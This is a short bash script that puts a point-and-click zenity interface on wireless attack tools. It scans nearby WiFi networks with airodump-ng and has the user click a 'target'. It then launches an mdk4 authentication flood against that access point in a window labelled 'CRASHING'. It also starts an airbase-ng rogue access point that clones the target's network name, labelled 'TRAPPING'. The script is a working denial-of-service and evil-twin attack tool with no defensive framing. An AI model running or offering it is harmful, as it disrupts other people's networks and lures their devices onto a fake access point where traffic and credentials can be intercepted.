#!/bin/bash

# --- 1. Selection ---
IFACE=$(zenity --list --title="Select Card" --column="Interface" $(ls /sys/class/net | grep wlan))
[ -z "$IFACE" ] && exit 1

# --- 2. Live Scan (The Monitoring Window) ---
rm -f /tmp/shabang_scan-01.csv
# We launch this window FIRST so you can see the targets
xterm -geometry 100x24 -T "1. CHOOSE TARGET HERE" -e "sudo airodump-ng $IFACE --band g -w /tmp/shabang_scan --output-format csv" &
SCAN_PID=$!

# Logic Gate: Wait for file
while [ ! -f /tmp/shabang_scan-01.csv ]; do sleep 1; done

# This popup stays until you see your target in the xterm window
zenity --info --text="Look at the Xterm window.\n\nOnce you see your target network, click OK here to pick it from the list."
kill $SCAN_PID

# --- 3. The Selection GUI ---
# This pulls the 'monitored' networks into a clickable list
TARGET_RAW=$(awk -F, 'NR>2 {print $1 "|" $14}' /tmp/shabang_scan-01.csv | zenity --list --title="2. CLICK YOUR TARGET" --column="BSSID" --column="SSID" --delimiter="|")

BSSID=$(echo $TARGET_RAW | cut -d'|' -f1 | tr -d ' ')
SSID=$(echo $TARGET_RAW | cut -d'|' -f2 | tr -d ' ')
CH=$(grep "$BSSID" /tmp/shabang_scan-01.csv | awk -F, '{print $4}' | tr -d ' ')

# --- 4. Launch Full Shabang ---
sudo iw dev $IFACE set channel $CH
xterm -T "CRASHING $BSSID" -e "sudo mdk4 $IFACE a -a $BSSID -m -s 1000" &
xterm -T "TRAPPING $SSID" -e "sudo airbase-ng -e '$SSID' -c $CH $IFACE" &
